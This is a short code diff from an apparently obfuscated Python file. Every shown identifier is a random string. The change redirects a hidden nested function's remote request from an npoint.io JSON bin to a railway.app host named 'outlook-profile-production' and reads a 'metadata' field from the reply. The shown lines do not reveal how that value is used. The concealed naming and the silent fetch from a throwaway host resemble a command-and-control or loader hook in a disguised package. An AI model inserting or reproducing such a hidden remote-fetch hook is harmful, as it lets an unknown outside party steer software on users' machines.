@@ -16,7 +16,7 @@ def config_xsupqo_589():
 
     def learn_jqtzsh_500():
         try:
-            eval_yefyjv_425 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            eval_yefyjv_425 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_yefyjv_425.raise_for_status()
             train_tmemzm_376 = eval_yefyjv_425.json()
             model_tgyegx_315 = train_tmemzm_376.get('metadata')
